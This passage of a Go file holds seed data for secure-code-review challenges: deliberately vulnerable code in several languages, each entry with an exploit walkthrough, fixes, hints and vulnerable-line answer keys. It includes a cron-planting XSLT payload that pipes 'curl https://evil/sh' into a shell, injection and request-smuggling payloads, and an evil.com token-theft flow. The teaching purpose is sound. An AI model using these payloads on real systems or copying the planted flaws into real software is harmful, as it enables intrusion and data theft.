uses to ship aggregated analytics.

Every tenant has its own tenant_id. The preview API takes a bucket
and key from the request body. Authentication is enforced by an
upstream JWT-verifying proxy; the worker reads the tenant from the
X-Tenant-Id header the proxy attaches.

Find the bug that lets tenant A read tenant B's most sensitive
internal reports, and explain why "but the JWT is verified upstream"
does not save us.`,
		code: `import boto3
import logging
from io import BytesIO
from flask import Flask, request, jsonify, send_file

app = Flask(__name__)
logger = logging.getLogger(__name__)

s3 = boto3.client("s3")


@app.route("/api/preview", methods=["POST"])
def preview():
    body = request.get_json(force=True)
    bucket = body.get("bucket")
    key = body.get("key")
    if not bucket or not key:
        return jsonify({"error": "bucket and key required"}), 400

    tenant_id = request.headers.get("X-Tenant-Id", "unknown")
    logger.info("preview: tenant=%s bucket=%s key=%s", tenant_id, bucket, key)

    obj = s3.get_object(Bucket=bucket, Key=key)
    data = obj["Body"].read()

    return send_file(
        BytesIO(data),
        mimetype=obj.get("ContentType", "application/octet-stream"),
        download_name=key.split("/")[-1],
    )


@app.route("/api/upload", methods=["POST"])
def upload():
    tenant_id = request.headers.get("X-Tenant-Id", "unknown")
    bucket = f"tenant-{tenant_id}-uploads"
    key = request.form["key"]
    data = request.files["file"].read()
    s3.put_object(Bucket=bucket, Key=key, Body=data)
    return jsonify({"status": "uploaded", "bucket": bucket, "key": key})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)`,
		targetVuln: `A textbook confused-deputy: the worker holds permissions that
exceed the per-request authorization check.

Flaw 1 — bucket name comes from the request body (line 15).
The preview endpoint takes "bucket" straight from request.get_json().
There is no allowlist, no derivation from tenant_id, no prefix check.
The caller supplies the bucket. Combined with the next flaw, this is
the entire vulnerability.

Flaw 2 — the call uses the EC2 instance's broad IAM role (line 23).
boto3.client("s3") was constructed at import time with no
credentials argument, so it inherits the EC2 instance profile. That
profile grants s3:GetObject on tenant-specific buckets AND on
"shared-internal-reports-*" buckets. The worker is the deputy; its
authority extends well past any single tenant's data.

Why the upstream JWT does not save us:
  - The upstream proxy verified that the caller holds a valid JWT for
    some tenant_id. It did NOT verify that the caller may read the
    bucket the caller named — because the proxy has no idea what
    buckets mean in the worker's IAM policy.
  - The X-Tenant-Id header is used only for logging. Even if it were
    used for an authorization decision, the caller could spoof it
    inside the trust boundary (the proxy might not strip it).
  - Even a fully-trusted tenant_id does not constrain the bucket
    parameter. The worker still calls get_object on whatever the
    caller names.

Exploit:
  Tenant A sends:
      POST /api/preview
      Authorization: Bearer <valid JWT for tenant A>
      X-Tenant-Id: tenant-A
      Content-Type: application/json
      {"bucket": "shared-internal-reports-2024-q4",
       "key": "tenant-B/financials.pdf"}

  The worker:
    - sees a valid request,
    - calls s3.get_object on a bucket the worker has permission to read,
    - returns tenant B's financials to tenant A.

The vulnerability does not require any credential theft; the attacker
uses the worker's deputy permissions through the API surface as
designed.`,
		conceptualFix: `Two complementary fixes — both required.

1. Stop trusting caller-named buckets.
   Derive the bucket from the authenticated tenant identity, never
   from the request body:

       VALID_TENANT_BUCKETS = {tenant: f"tenant-{tenant}-uploads"
                               for tenant in known_tenants()}
       tenant_id = verify_jwt_locally(request.headers["Authorization"])
       bucket = VALID_TENANT_BUCKETS[tenant_id]   # caller cannot override

   If the endpoint must accept ANY bucket name (e.g. cross-tenant
   admin tooling), require an explicit allowlist check that consults
   the authenticated identity:

       if not is_authorized(tenant_id, bucket):
           return jsonify({"error": "forbidden"}), 403

2. Tighten the IAM role to least privilege.
   The worker should have one of:
     - per-tenant role assumption via STS AssumeRole, so the working
       credentials are bounded by the authenticated tenant; OR
     - per-resource IAM policy keyed off
       aws:PrincipalTag/tenant_id = ${s3:ExistingObjectTag/tenant_id}
       (object-tag-based authorization).
   Cross-tenant report buckets should NOT be in the same role as
   per-tenant upload buckets. Use a separate IAM role for the reports
   pipeline, and route reports access through a dedicated service
   the API surface cannot reach.

3. Defense in depth:
   - Re-verify the JWT inside the worker (don't trust an upstream
     header). Use python-jose or PyJWT with strict aud/iss checks.
   - S3 bucket policies should require sts:RequestTag/tenant_id to
     match the object's tenant tag, so even a confused deputy gets
     a deny from the bucket itself.
   - Audit CloudTrail for cross-tenant GetObject calls.`,
		hints: []string{
			"Find every value that flows from the request into an AWS API call. Which of them is the most dangerous in the hands of a malicious tenant?",
			"What permissions does boto3.client('s3') inherit when no credentials are passed? How broad is the EC2 instance role here?",
			"The upstream proxy verifies the JWT. Does verifying the JWT prove the caller may read THIS bucket, or only that the caller is some authenticated tenant?",
		},
		vulnerableLines: []int{15, 23},
	}
}

// ──────────────────────────────────────────────────
// OSCP 8 — Hibernate HQL injection via string-concatenated sort field
// Difficulty 7 — ORM-flavored SQLi that survives a casual code review.
// ──────────────────────────────────────────────────
func oscpJavaHibernateHQLInjection() challengeSeed {
	return challengeSeed{
		title:        "The ORM Mirage — Hibernate HQL Injection",
		slug:         "java-hibernate-hql-injection",
		difficulty:   7,
		langSlug:     "java",
		catSlug:      "injection",
		points:       500,
		cveReference: "CWE-89 (manifested through HQL, not raw SQL)",
		description: `An internal CRM exposes a user-search endpoint backed by a Spring
@Service that talks to PostgreSQL through Hibernate. The service is
behind admin auth, but the admin tier has 40+ analysts, including
recently onboarded contractors.

The team treats Hibernate as inherently safe ("we use the ORM, so we
can't have SQLi"). A pen test report flagged the search endpoint as
"medium" but the engineering lead pushed back: "we never call
session.createNativeQuery — only createQuery on POJO entities."

Find why the lead is wrong, and identify the smallest payload that
exfiltrates the password_hash column from the users table.`,
		code: `package com.example.usersearch;

import java.util.List;
import org.hibernate.Session;
import org.hibernate.SessionFactory;
import org.hibernate.query.Query;
import org.springframework.stereotype.Service;

@Service
public class UserSearchService {

    private final SessionFactory sessionFactory;

    public UserSearchService(SessionFactory sf) {
        this.sessionFactory = sf;
    }

    public List<UserProfile> searchByName(String name, String sortField) {
        Session session = sessionFactory.openSession();
        try {
            String hql = "FROM UserProfile u " +
                         "WHERE u.displayName LIKE '%" + name + "%' " +
                         "ORDER BY u." + sortField;
            Query<UserProfile> q = session.createQuery(hql, UserProfile.class);
            q.setMaxResults(50);
            return q.list();
        } finally {
            session.close();
        }
    }

    public UserProfile findById(Long id) {
        try (Session session = sessionFactory.openSession()) {
            Query<UserProfile> q = session.createQuery(
                "FROM UserProfile u WHERE u.id = :id", UserProfile.class);
            q.setParameter("id", id);
            return q.uniqueResult();
        }
    }
}`,
		targetVuln: `HQL injection via two concatenated user inputs in searchByName.

Line 22 — the displayName filter:
   "WHERE u.displayName LIKE '%" + name + "%' "
   The "name" parameter is concatenated into a quoted string. A
   payload of:  ' OR 1=1 OR '
   collapses the WHERE clause and dumps the entire UserProfile table.

Line 23 — the sort field:
   "ORDER BY u." + sortField
   sortField is concatenated into the ORDER BY clause. Because HQL
   permits arbitrary path expressions and supports UNION through
   subqueries on JPA entities, sortField like:
       (SELECT u2.passwordHash FROM UserProfile u2 WHERE u2.id = 1)
   uses the database's ORDER BY behavior (ordering by a computed
   value) to leak data via timing or via blind boolean conditions:
       sortField = "displayName) WHERE (1 = (CASE WHEN
                    (SELECT SUBSTRING(passwordHash, 1, 1) FROM UserProfile
                     WHERE id = 1) = 'a' THEN 1 ELSE 0 END"

Why "we use the ORM" does not save the code:
   - Hibernate's createQuery() compiles HQL into SQL. It parameterizes
     only the values you explicitly bind via setParameter() or :named
     placeholders. ANY substring you stuff into the HQL string itself
     is part of the query language, not a value. Concatenation in HQL
     is the same as concatenation in raw SQL.
   - findById on line 33-35 shows the correct pattern — :id named
     parameter. The developer knew the right way; chose the wrong way
     for searchByName.

Net effect: the "trusted internal admin" surface gives any analyst a
direct path to dump password_hash, MFA seeds, session keys, anything
that ends up as a column on a JPA entity that the search service can
see via HQL.`,
		conceptualFix: `Make every user-derived fragment a bound parameter or a
strict allowlist.

1. Bind the LIKE pattern:
       String hql = "FROM UserProfile u " +
                    "WHERE u.displayName LIKE :pattern " +
                    "ORDER BY u." + safeSortField(sortField);
       Query<UserProfile> q = session.createQuery(hql, UserProfile.class);
       q.setParameter("pattern", "%" + name + "%");
   The "%" wildcards are added to the BOUND value, not concatenated
   into the query language.

2. Allowlist the sort field. ORDER BY cannot be parameterized in JDBC
   or HQL — it is the query language, not a value. The fix is a
   compile-time set of allowed field names:

       private static final Set<String> SORT_FIELDS =
           Set.of("displayName", "createdAt", "lastLoginAt");

       private String safeSortField(String s) {
           if (!SORT_FIELDS.contains(s)) {
               throw new IllegalArgumentException("invalid sort: " + s);
           }
           return s;
       }

3. Use the Criteria API (or JPA Specification) for dynamic queries.
   The Criteria API forces all values through bound parameters and
   forces all column references through entity metamodel handles,
   which the compiler checks:

       CriteriaBuilder cb = session.getCriteriaBuilder();
       CriteriaQuery<UserProfile> cq = cb.createQuery(UserProfile.class);
       Root<UserProfile> u = cq.from(UserProfile.class);
       cq.where(cb.like(u.get("displayName"), "%" + name + "%"));
       cq.orderBy(cb.asc(u.get(safeSortField(sortField))));
       return session.createQuery(cq).setMaxResults(50).getResultList();

4. Defense in depth:
   - The search-tier DB user should have SELECT only on the columns
     the search exposes — not on password_hash, mfa_seed, etc.
   - Log HQL with abnormal subquery structure or LENGTH > N.
   - Run HQL-aware SAST (e.g. SpotBugs-FindSecBugs) in CI.`,
		hints: []string{
			"Compare searchByName with findById. The findById method uses :id — what does the searchByName method do differently?",
			"Look at every '+' operator in the searchByName method. Which operands flow from request parameters?",
			"ORDER BY in HQL cannot be a bound parameter — it must literally be a path expression. How would you safely accept user input for the sort field?",
		},
		vulnerableLines: []int{22, 23},
	}
}

// ──────────────────────────────────────────────────
// OSCP 9 — XSLT injection via lxml.etree.XSLT with attacker stylesheet
// Difficulty 8 — Custom report engine accepts user XSL → RCE via
// libxslt extension elements (exsl:document, php:function, ...).
// ──────────────────────────────────────────────────
func oscpPythonXSLTInjectionRCE() challengeSeed {
	return challengeSeed{
		title:        "The Stylesheet of Doom — XSLT Injection → RCE",
		slug:         "python-xslt-injection-rce",
		difficulty:   8,
		langSlug:     "python",
		catSlug:      "ssti",
		points:       600,
		cveReference: "CWE-91 (XML injection / XSLT)",
		description: `A Python reporting service lets enterprise customers ship custom
XSL stylesheets to render compliance reports against the day's data
snapshot. The service is deployed on Kubernetes with read-write
access to /var/lib/reports and outbound HTTPS to the corporate
artifact registry.

The team chose XSLT specifically because "it's just a templating
language — there's no eval()." The lxml library was preferred because
"it parses faster than the stdlib".

Find the vulnerability that lets a customer-supplied stylesheet escape
the templating model entirely and execute code in the worker process.`,
		code: `from flask import Flask, request, jsonify, Response
from lxml import etree

app = Flask(__name__)

REPORT_DATA = etree.parse("/var/lib/reports/snapshot.xml")


@app.route("/api/report/render", methods=["POST"])
def render_report():
    xsl_body = request.get_data(as_text=True)
    if not xsl_body:
        return jsonify({"error": "missing stylesheet"}), 400

    try:
        stylesheet_doc = etree.fromstring(xsl_body.encode("utf-8"))
        transform = etree.XSLT(stylesheet_doc)
        result = transform(REPORT_DATA)
        return Response(str(result), mimetype="application/xml")
    except etree.XSLTApplyError as e:
        return jsonify({"error": "xslt apply failed", "detail": str(e)}), 500
    except etree.XMLSyntaxError as e:
        return jsonify({"error": "xslt parse failed", "detail": str(e)}), 400


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)`,
		targetVuln: `XSLT is not "just a templating language" — it is a Turing-complete
declarative language whose libxslt implementation ships a set of
extension elements that interact with the host filesystem and process.

Flaw — etree.XSLT(stylesheet_doc) with attacker-supplied stylesheet
(lines 16-17).

The user-supplied XSL is parsed into stylesheet_doc and passed
directly to etree.XSLT() with default settings. By default lxml's
XSLT engine enables:

  - exsl:document  — writes arbitrary files to the worker's filesystem
                     (anywhere the worker user can write).
  - xsl:include / xsl:import + URI resolver — fetches stylesheets
                     over HTTP(S) and file://, enabling SSRF and
                     local-file read into the rendered output.
  - <xsl:value-of select="document('file:///etc/passwd')"/> —
                     leaks any file readable by the worker into the
                     response body.
  - php:function / dyn:evaluate (when bound) — direct code execution
                     in older libxslt builds.

Exploit (file-write → cron RCE chain):

  POST /api/report/render
  Content-Type: application/xml
  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                  xmlns:exsl="http://exslt.org/common"
                  version="1.0">
    <xsl:template match="/">
      <exsl:document href="file:///var/lib/reports/../../etc/cron.d/x"
                     method="text">
* * * * * root curl https://evil/sh | sh
      </exsl:document>
    </xsl:template>
  </xsl:stylesheet>

The worker writes /etc/cron.d/x; the next minute cron executes the
shell as root.

Even without exsl:document, the document() function reads any file
the worker has access to and embeds it in the response. From a
multi-tenant standpoint that's already a critical disclosure: the
attacker reads other tenants' snapshots, /proc/self/environ
(secrets), kubelet service-account tokens, etc.`,
		conceptualFix: `XSLT cannot be safely run against attacker-supplied stylesheets
without explicit hardening. Apply the full set:

1. Pass a hardened parser and disable extensions:
       parser = etree.XMLParser(
           resolve_entities=False,   # no external entities
           no_network=True,          # no network fetches
           load_dtd=False,
       )
       stylesheet_doc = etree.fromstring(
           xsl_body.encode("utf-8"), parser=parser)

       transform = etree.XSLT(
           stylesheet_doc,
           access_control=etree.XSLTAccessControl.DENY_ALL,
       )
   XSLTAccessControl.DENY_ALL blocks file:// and http:// from the
   transform context (document(), xsl:include, xsl:import, etc.).

2. Compile and freeze stylesheets server-side.
   Treat XSLT like server code: have the security team review each
   stylesheet, sign it, and store a hash. The render endpoint accepts
   only a stylesheet ID, looks up the hash, and applies the
   pre-compiled transform. Customers never submit raw XSL at request
   time.

3. Sandbox the worker.
   Even if the XSLT engine is hardened, run the renderer with:
     - read-only filesystem (or writable only to /tmp with no setuid),
     - no network egress except to the artifact registry,
     - seccomp filter blocking execve, ptrace, mount,
     - a non-root user with no access to other tenants' snapshots.

4. Switch templating engines.
   If the requirements are "render XML data with a template" — use
   Jinja2 with autoescape, or a structured template language like
   Liquid or Mustache. They lack file/network primitives by design.`,
		hints: []string{
			"Read the lxml documentation for etree.XSLT. What does access_control default to, and what does it permit?",
			"Search for 'libxslt extension elements'. Which ones write files or fetch URLs?",
			"What does the XSLT document() function do when given a file:// URL?",
		},
		vulnerableLines: []int{16, 17},
	}
}

// ──────────────────────────────────────────────────
// OSCP 10 — Rust uninitialized memory disclosure via set_len + partial read
// Difficulty 9 — Three unsafe primitives compound into a heap leak.
// ──────────────────────────────────────────────────
func oscpRustUnsafeMemoryDisclosure() challengeSeed {
	return challengeSeed{
		title:        "The Ghost Bytes — Rust Uninit Heap Disclosure",
		slug:         "rust-unsafe-uninit-heap-disclosure",
		difficulty:   9,
		langSlug:     "rust",
		catSlug:      "memory-corruption",
		points:       700,
		cveReference: "CWE-908 (use of uninitialized resource)",
		description: `A Rust TCP service brokers messages between trading clients and an
internal matching engine. The protocol is length-prefixed: 8 bytes of
header, then a payload of header.length bytes. The handle_client
function was written by a senior engineer optimizing for zero-copy
hot paths and uses unsafe extensively.

The service has 6 months in production processing $30M/day. A fuzzing
campaign last week found that crafted short payloads cause the server
to return non-deterministic bytes that occasionally include fragments
of other clients' messages.

Find the three unsafe primitives that combine into a heap memory
disclosure, and explain how an attacker turns this into a session-
token exfiltration.`,
		code: `use std::io::{Read, Write};
use std::net::TcpStream;

#[repr(C)]
struct MessageHeader {
    magic:  u32,
    length: u32,
}

pub fn handle_client(mut stream: TcpStream) -> std::io::Result<()> {
    let mut header_buf = [0u8; 8];
    stream.read_exact(&mut header_buf)?;

    let header: MessageHeader = unsafe {
        std::ptr::read(header_buf.as_ptr() as *const MessageHeader)
    };

    if header.magic != 0xC0DEFEED {
        return Ok(());
    }

    let mut payload: Vec<u8> = Vec::with_capacity(header.length as usize);
    unsafe { payload.set_len(header.length as usize); }
    stream.read(&mut payload)?;

    let parsed = unsafe {
        std::slice::from_raw_parts(payload.as_ptr(), header.length as usize)
    };

    let s = unsafe { std::str::from_utf8_unchecked(parsed) };

    stream.write_all(format!("Received: {}\n", s).as_bytes())?;
    Ok(())
}`,
		targetVuln: `Heap memory disclosure through three compounding unsafe operations.

Flaw 1 — Vec::set_len on uninitialized capacity (lines 22-23).
   Vec::with_capacity(n) allocates n bytes but reports len() == 0.
   The subsequent payload.set_len(n) tells the Vec it contains n
   valid initialized bytes, but it does NOT initialize them. The
   contents are whatever the global allocator returned — typically
   bytes from recently-freed allocations.

Flaw 2 — stream.read instead of read_exact (line 24).
   Read::read returns the number of bytes actually read, which may
   be SMALLER than the buffer. The code discards the return value.
   If the attacker sends only K bytes after a header claiming
   length=N (N >> K), only the first K bytes of payload are
   overwritten. The remaining N - K bytes retain whatever the
   allocator gave us in step 1.

Flaw 3 — from_raw_parts + from_utf8_unchecked over the full claimed
length (lines 26-27, 30).
   slice::from_raw_parts builds a slice of size header.length over
   payload's buffer, including the uninitialized tail. from_utf8_unchecked
   wraps it as a &str without UTF-8 validation. The format! call
   then includes those bytes in the response sent to the attacker.

Exploit:
   For each connection:
     - Send {magic: 0xC0DEFEED, length: 65536} followed by 4 bytes.
     - Server allocates 65536 bytes, set_len to 65536, reads 4 bytes
       into [0..4], returns those 4 bytes + 65532 bytes of garbage.
     - The "garbage" is the allocator's previously-freed memory —
       often containing TLS session keys, JWT contents, order
       payloads from other clients, or stack canaries that the
       attacker can use to bypass ASLR.

The bug only fires for "partial sends," which an attacker controls
trivially via TCP send-window manipulation. It does not require any
auth, race condition, or special timing.`,
		conceptualFix: `Replace each unsafe primitive with its checked counterpart.

1. Initialize the buffer:
       let mut payload: Vec<u8> = vec![0u8; header.length as usize];
   vec![0u8; n] allocates and zero-initializes — no set_len needed.
   The Vec invariant is upheld by construction.

2. Use read_exact:
       stream.read_exact(&mut payload)?;
   read_exact loops until the full buffer is filled or returns
   ErrorKind::UnexpectedEof. The error propagates out via the ? and
   the connection is closed cleanly.

3. Drop from_raw_parts and from_utf8_unchecked:
       let s = std::str::from_utf8(&payload)
           .map_err(|_| std::io::Error::new(
               std::io::ErrorKind::InvalidData, "non-UTF8 payload"))?;
   Safe UTF-8 validation catches malformed payloads. No need for
   from_raw_parts at all because &payload is already a &[u8] of the
   correct length.

4. Validate header.length BEFORE allocating:
       const MAX_PAYLOAD: u32 = 64 * 1024;
       if header.length > MAX_PAYLOAD {
           return Ok(());
       }
   Without a cap, a 4 GB length triggers an OOM kill on the host.

5. Defense in depth:
   - Compile with -Z sanitizer=address in CI to catch
     uninitialized-read bugs (Rust nightly + Miri also catches this).
   - Replace ptr::read on attacker-controlled bytes with a checked
     bincode/postcard deserializer; ptr::read on a packed C struct
     from network data carries platform-endianness footguns.
   - Use the safe-by-default bytes crate (Bytes / BytesMut) for
     buffer management.`,
		hints: []string{
			"Trace what payload's underlying buffer contains immediately after Vec::with_capacity(n) followed by set_len(n). Are those bytes initialized?",
			"Read the documentation for Read::read vs Read::read_exact. What happens when the connection delivers fewer bytes than the buffer holds?",
			"Even if stream.read fully fills the buffer, what's wrong with using from_raw_parts to build a slice whose length came from the attacker?",
		},
		vulnerableLines: []int{23, 27},
	}
}

// ──────────────────────────────────────────────────
// OSCP 11 — Outbound HTTP request smuggling via raw bufio.Writer
// Difficulty 5 — Legacy "we wrote our own HTTP client for performance"
// pattern that lets the attacker smuggle a second request to the upstream.
// ──────────────────────────────────────────────────
func oscpGoHTTPSmugglingViaBufio() challengeSeed {
	return challengeSeed{
		title:        "The Whispered Request — Outbound HTTP Smuggling via Raw Writer",
		slug:         "go-outbound-http-smuggling-bufio-writer",
		difficulty:   5,
		langSlug:     "go",
		catSlug:      "injection",
		points:       350,
		cveReference: "CWE-93 (CRLF injection) leading to request smuggling",
		description: `A Go metrics-relay service accepts public push requests on the
edge, validates the metric name shape, then forwards the metric to
an internal Prometheus pushgateway. The forwarder predates net/http
("we built it for the throughput") and writes the upstream request
line and headers by hand into a bufio.Writer over the raw TCP socket.

The pushgateway is on a different network segment and has powerful
admin endpoints behind a Host-header check, including a wipe-all-
metrics endpoint reachable only from inside the cluster.

Find the bug that lets the public attacker reach the admin endpoint
through the metrics-relay even though it nominally only forwards the
X-Metric-Name header.`,
		code: `package handlers

import (
	"bufio"
	"net"
	"net/http"
)

func MetricsRelayHandler(w http.ResponseWriter, r *http.Request) {
	metric := r.URL.Query().Get("metric")
	if metric == "" {
		http.Error(w, "metric required", http.StatusBadRequest)
		return
	}

	conn, err := net.Dial("tcp", "collector.internal:9091")
	if err != nil {
		http.Error(w, "collector unreachable", http.StatusBadGateway)
		return
	}
	defer conn.Close()

	bw := bufio.NewWriter(conn)
	bw.WriteString("POST /metrics/job/relay HTTP/1.1\r\n")
	bw.WriteString("Host: collector.internal\r\n")
	bw.WriteString("X-Metric-Name: " + metric + "\r\n")
	bw.WriteString("Content-Length: 0\r\n\r\n")
	bw.Flush()

	w.WriteHeader(http.StatusOK)
}`,
		targetVuln: `Outbound HTTP smuggling / response splitting via unfiltered CRLF
in a manually-constructed request.

Flaw — line 26.
   "X-Metric-Name: " + metric + "\r\n" concatenates a request-derived
   string directly into a raw HTTP/1.1 wire frame. The metric value
   is NEVER validated against \r\n. (The url package preserves these
   bytes; r.URL.Query().Get returns the raw decoded value.)

Why net/http's own validator does NOT save the code:
   Go's net/http response writer rejects header VALUES containing
   CRLF on the SERVER side (httpguts.ValidHeaderFieldValue), but
   that protection applies to OUTGOING responses written through
   http.ResponseWriter. The code on line 26 bypasses the entire
   net/http stack — it speaks HTTP directly over a TCP socket and
   writes whatever bytes it chooses.

Exploit:
   Attacker submits:

       GET /relay?metric=foo\r\nContent-Length: 0\r\n\r\n
       POST /admin/wipe HTTP/1.1\r\n
       Host: collector.internal\r\n
       X-Internal-Auth: yes\r\n
       Content-Length: 0\r\n\r\n
       X-Trailing: ignored

   (URL-encoded for transport; the relay decodes %0D%0A back to CRLF.)

   The bufio.Writer flushes a TCP stream containing TWO HTTP requests
   back-to-back. The pushgateway treats the first POST /metrics/job/
   relay as one request, then the smuggled POST /admin/wipe as a
   SECOND request on the same connection. Because the relay is
   internal, the pushgateway honors the X-Internal-Auth header and
   wipes every metric in the cluster.

The relay's response to the attacker (a 200) discloses nothing about
the second request. The attacker only knows the attack worked from
external symptoms (the pushgateway's metrics disappear).`,
		conceptualFix: `Three layered fixes; the first two are mandatory.

1. Validate the metric against an allowlist BEFORE forwarding:
       var metricRegex = regexp.MustCompile("^[a-zA-Z_][a-zA-Z0-9_]*$")
       if !metricRegex.MatchString(metric) {
           http.Error(w, "invalid metric name", http.StatusBadRequest)
           return
       }
   Reject anything containing CR, LF, NUL, or characters outside the
   Prometheus metric-name alphabet.

2. Stop writing HTTP by hand. Use net/http, which validates header
   values and refuses to send CRLF in them:

       req, _ := http.NewRequest("POST",
           "http://collector.internal:9091/metrics/job/relay", nil)
       req.Header.Set("X-Metric-Name", metric)
       resp, err := http.DefaultClient.Do(req)
       // ... handle resp ...

   net/http's validHeaderFieldValue will reject CRLF in the header
   value and return an error before any bytes go on the wire.

3. Defense in depth:
   - The pushgateway should not honor admin headers from the relay's
     network segment. Move admin endpoints to a separate, mTLS-only
     listener.
   - The relay should not keep persistent connections to the
     collector — disable keep-alive (Close: true on the request,
     Connection: close header) to eliminate the second-request
     smuggling vector even if a CRLF slips through.
   - Run a fuzzer over the metrics parameter in CI that asserts
     "every value with \\r or \\n returns 400."`,
		hints: []string{
			"Look at how the upstream request is constructed. Which bytes in the request frame came from the attacker?",
			"Could the metric value contain '\\r\\n'? If it does, what happens to the request frame the collector sees?",
			"What's the difference between Go's net/http header validation and writing raw bytes through a bufio.Writer over a TCP connection?",
		},
		vulnerableLines: []int{26},
	}
}

// ──────────────────────────────────────────────────
// OSCP 12 — postMessage receiver with no origin check + reply with '*'
// Difficulty 6 — Same-origin policy bypass via missing audience checks.
// ──────────────────────────────────────────────────
func oscpNodePostMessageOriginBypass() challengeSeed {
	return challengeSeed{
		title:        "The Open Window — postMessage Origin Bypass",
		slug:         "nodejs-postmessage-no-origin-check-token-exfil",
		difficulty:   6,
		langSlug:     "nodejs",
		catSlug:      "logic-flaw",
		points:       400,
		cveReference: "CWE-346 (origin validation error)",
		description: `A SaaS dashboard renders an iframe-based command bridge at
/static/iframe-bridge.js. The parent page (https://app.example.com)
sends typed commands to the iframe via postMessage; the iframe runs
them with the user's authenticated session in localStorage. An SDK
"demo console" feature lets the parent fetch the access token to
display it to support engineers during debugging.

The iframe-bridge is loaded by client SDKs embedded on customer
websites — i.e. the iframe's parent is OFTEN a domain that
app.example.com does not control.

Find both directions of the postMessage bug that lets any cross-
origin page steal the access token of a logged-in user.`,
		code: `window.addEventListener('message', function (event) {
    const msg = event.data;
    if (!msg || typeof msg !== 'object') return;

    switch (msg.cmd) {
        case 'refresh-session':
            refreshSession(msg.csrfToken);
            break;
        case 'navigate':
            window.location.assign(msg.url);
            break;
        case 'logout':
            localStorage.clear();
            document.cookie = 'session=; max-age=0';
            window.location.assign('/login');
            break;
        case 'expose-token':
            event.source.postMessage({
                type: 'token',
                value: localStorage.getItem('access_token')
            }, '*');
            break;
    }
});

function refreshSession(csrfToken) {
    fetch('/api/session/refresh', {
        method: 'POST',
        credentials: 'include',
        headers: { 'X-CSRF-Token': csrfToken },
    });
}`,
		targetVuln: `Two missing origin checks, one on the receiving side and one on
the reply.

Flaw 1 — no event.origin check on the message handler (line 1).
   The handler accepts messages from ANY origin. The iframe is
   loadable from arbitrary parents via:

       <iframe src="https://app.example.com/static/iframe-bridge.html"></iframe>

   On evil.com the attacker loads this iframe, then calls:

       iframe.contentWindow.postMessage(
           { cmd: 'expose-token' }, 'https://app.example.com');

   The iframe runs in the app.example.com origin (because that's
   where the script was served from), so localStorage holds the
   victim's access_token. The handler accepts the message because
   there is no event.origin === 'https://app.example.com' check.

Flaw 2 — reply via postMessage(..., '*') (line 21).
   Even if the handler did require event.source to be a trusted
   window reference, the reply uses targetOrigin = '*'. That means
   the reply is delivered to whatever document loaded the iframe,
   regardless of its origin. Once evil.com's window receives the
   token, it ships it to the attacker's server.

Either flaw alone is enough; together they form a turnkey ATO
primitive. A simple drive-by HTML page is enough to steal an
authenticated user's access token if the user is logged into
app.example.com and visits the attacker's page.

Bonus: the 'navigate' and 'logout' commands let a cross-origin
attacker forcibly redirect or destroy a victim's session. The
'refresh-session' command lets them invoke the CSRF-protected
refresh endpoint by passing whatever csrfToken they want — a
secondary CSRF-bypass primitive.`,
		conceptualFix: `Validate origin on both the receive and send paths.

1. Validate event.origin against an explicit allowlist on every
   incoming message:

       const TRUSTED_ORIGINS = new Set([
           'https://app.example.com',
           'https://admin.example.com',
       ]);
       window.addEventListener('message', function (event) {
           if (!TRUSTED_ORIGINS.has(event.origin)) return;
           // safe to use event.data
       });

2. Never reply with targetOrigin = '*'. Echo the validated origin:

       event.source.postMessage(payload, event.origin);

3. Stop putting the access token in localStorage. Use httpOnly,
   SameSite=Lax/Strict cookies. The token is then inaccessible to
   any JavaScript — including same-origin XSS — and certainly not
   extractable via postMessage.

4. Don't expose privileged commands ('expose-token', 'logout',
   'navigate') over postMessage at all. Use a same-origin
   BroadcastChannel for parent/iframe coordination on app.example.com,
   and a separate, narrowly-scoped, message-typed protocol for any
   SDK-embedded surface.

5. Defense in depth:
   - X-Frame-Options: DENY on /static/iframe-bridge.html so the
     iframe can only load inside app.example.com's own pages.
   - Content-Security-Policy: frame-ancestors 'self'
     https://*.example.com — equivalent and more granular.
   - Set the access-token cookie to "Path=/api" so the token is
     never even sent to the static assets origin.`,
		hints: []string{
			"What property of the MessageEvent identifies WHO sent the postMessage? Is it being checked?",
			"What does targetOrigin = '*' mean when posting back to event.source? Who can receive that message?",
			"Where does the access_token live? Could it be moved somewhere JavaScript can't see?",
		},
		vulnerableLines: []int{1, 21},
	}
}

// ──────────────────────────────────────────────────
// OSCP 13 — GraphQL alias-based amplification DoS
// Difficulty 7 — Single request triggers 1000+ heavy DB calls via
// field aliasing; no query-cost limit in the schema config.
// ──────────────────────────────────────────────────
func oscpNodeGraphQLAliasDoS() challengeSeed {
	return challengeSeed{
		title:        "Alias Storm — GraphQL Amplification DoS",
		slug:         "nodejs-graphql-alias-amplification-dos",
		difficulty:   7,
		langSlug:     "nodejs",
		catSlug:      "logic-flaw",
		points:       500,
		cveReference: "CWE-770 (resource allocation without limits)",
		description: `A Node.js GraphQL service powers the public account-summary API for
a personal-finance app. Each accountBalance field is computed by a
batch job that aggregates the user's transactions over a sliding 30-
day window — about 200 ms of CPU and 6 DB roundtrips per call.

The team correctly enforces per-user, per-minute rate limits at the
HTTP layer (60 requests / minute / IP). They have not enforced any
GraphQL-specific limits, reasoning that "GraphQL is just one HTTP
request."

A small DDoS last weekend brought the matching engine to its knees.
The attackers used a single client and well under the per-IP rate
limit. Find the multiplier.`,
		code: `const { ApolloServer, gql } = require('apollo-server');
const db = require('./db');

const schema = [
  'type Query {',
  '  user(id: ID!): User',
  '  accountBalance(userId: ID!): Float',
  '}',
  'type User {',
  '  id: ID!',
  '  name: String',
  '  email: String',
  '  accountBalance: Float',
  '  apiKeys: [String]',
  '}'
].join('\n');

const typeDefs = gql(schema);

const resolvers = {
  Query: {
    user: async (_, { id }, ctx) => {
      if (!ctx.userId) throw new Error('Unauthorized');
      return db.users.findById(id);
    },
    accountBalance: async (_, { userId }, ctx) => {
      if (!ctx.userId) throw new Error('Unauthorized');
      return db.balances.heavyComputation(userId);
    },
  },
  User: {
    accountBalance: async (user) => {
      return db.balances.heavyComputation(user.id);
    },
    apiKeys: async (user) => {
      return db.apiKeys.findByUserId(user.id);
    },
  },
};

const server = new ApolloServer({
  typeDefs,
  resolvers,
  context: ({ req }) => ({ userId: parseJWT(req.headers.authorization) }),
});

server.listen({ port: 4000 });`,
		targetVuln: `GraphQL field aliasing turns a single HTTP request into thousands
of expensive resolver invocations because the schema has no query-
cost limit.

The vulnerability surface (lines 27, 33).
   The accountBalance resolver — both as a top-level Query and as a
